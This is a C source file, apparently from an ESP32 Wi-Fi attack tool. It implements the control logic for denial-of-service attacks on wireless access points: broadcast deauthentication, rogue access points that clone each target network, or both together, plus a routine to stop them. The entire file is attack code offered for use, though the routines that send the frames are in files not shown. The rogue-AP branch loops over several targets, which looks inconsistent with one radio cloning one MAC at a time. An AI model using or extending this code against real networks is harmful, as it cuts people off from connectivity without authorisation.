/**
 * @file attack_dos.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-07
 * @copyright Copyright (c) 2021
 * 
 * @brief Implements DoS attacks using deauthentication methods
 */
#include "attack_dos.h"

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_timer.h"

#include "attack.h"
#include "attack_method.h"
#include "wifi_controller.h"
#include <string.h> 

static const char *TAG = "main:attack_dos";
static attack_dos_methods_t method = -1;
static wifi_ap_record_t *target_aps = NULL;
static uint8_t ap_count = 0;

void attack_dos_start(attack_config_t *attack_config) {
    ESP_LOGI(TAG, "Starting DoS attack against %d networks...", attack_config->ap_count);
    method = attack_config->method;
    ap_count = attack_config->ap_count;
    
    // Save a copy of target APs
    if (ap_count > 0) {
        target_aps = malloc(sizeof(wifi_ap_record_t) * ap_count);
        if (!target_aps) {
            ESP_LOGE(TAG, "Failed to allocate memory for AP records!");
            return;
        }
        memcpy(target_aps, attack_config->ap_records, sizeof(wifi_ap_record_t) * ap_count);
    }

    switch(method) {
        case ATTACK_DOS_METHOD_BROADCAST:
            ESP_LOGD(TAG, "ATTACK_DOS_METHOD_BROADCAST");
            if (ap_count > 0) {
                attack_method_broadcast(target_aps, ap_count);
            }
            break;
            
        case ATTACK_DOS_METHOD_ROGUE_AP:
            ESP_LOGD(TAG, "ATTACK_DOS_METHOD_ROGUE_AP");
            if (ap_count > 0) {
                // Start Rogue AP for all target networks
                for (int i = 0; i < ap_count; i++) {
                    attack_method_rogueap(&target_aps[i]);
                }
            }
            break;
            
        case ATTACK_DOS_METHOD_COMBINE_ALL:
            ESP_LOGD(TAG, "ATTACK_DOS_METHOD_COMBINE_ALL");
            if (ap_count > 0) {
                // Start Rogue AP for all targets
                for (int i = 0; i < ap_count; i++) {
                    attack_method_rogueap(&target_aps[i]);
                }
                // Start broadcast attack
                attack_method_broadcast(target_aps, ap_count);
            }
            break;
            
        default:
            ESP_LOGE(TAG, "Method unknown! DoS attack not started.");
    }
}

void attack_dos_stop() {
    switch(method) {
        case ATTACK_DOS_METHOD_BROADCAST:
            attack_method_broadcast_stop();
            break;
            
        case ATTACK_DOS_METHOD_ROGUE_AP:
            // Stop all Rogue AP instances
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
            
        case ATTACK_DOS_METHOD_COMBINE_ALL:
            // Stop broadcast attack
            attack_method_broadcast_stop();
            // Stop all Rogue AP instances
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
            
        default:
            ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly.");
    }
    
    // Free allocated AP records
    if (target_aps) {
        free(target_aps);
        target_aps = NULL;
    }
    ap_count = 0;
    
    ESP_LOGI(TAG, "DoS attack stopped");
}
